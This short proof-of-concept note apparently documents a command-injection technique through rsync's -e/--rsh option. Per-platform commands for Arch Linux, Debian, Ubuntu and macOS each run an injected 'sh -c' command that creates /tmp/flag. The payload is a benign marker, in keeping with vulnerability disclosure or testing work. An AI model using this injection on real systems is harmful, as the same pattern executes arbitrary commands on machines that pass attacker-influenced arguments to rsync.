*Note: All tested versions require spaces and append `-l git github.com rsync
--server . .` to command:*

## archlinux (rsync 3.1.2)
```
rsync -e='sh -c "touch /tmp/flag" --' /proc/self/status git@github.com:
```

## debian (rsync 3.1.1)
```
rsync -e='sh -c "touch /tmp/flag" --' /proc/self/status git@github.com:
```

## ubuntu (rsync 3.1.2)
```
rsync -e='sh -c "touch /tmp/flag" --' /proc/self/status git@github.com:
```

## macOS (rsync 2.6.9)
```
rsync --rsh='sh -c "touch /tmp/flag" --' /proc/self/status git@github.com:
```
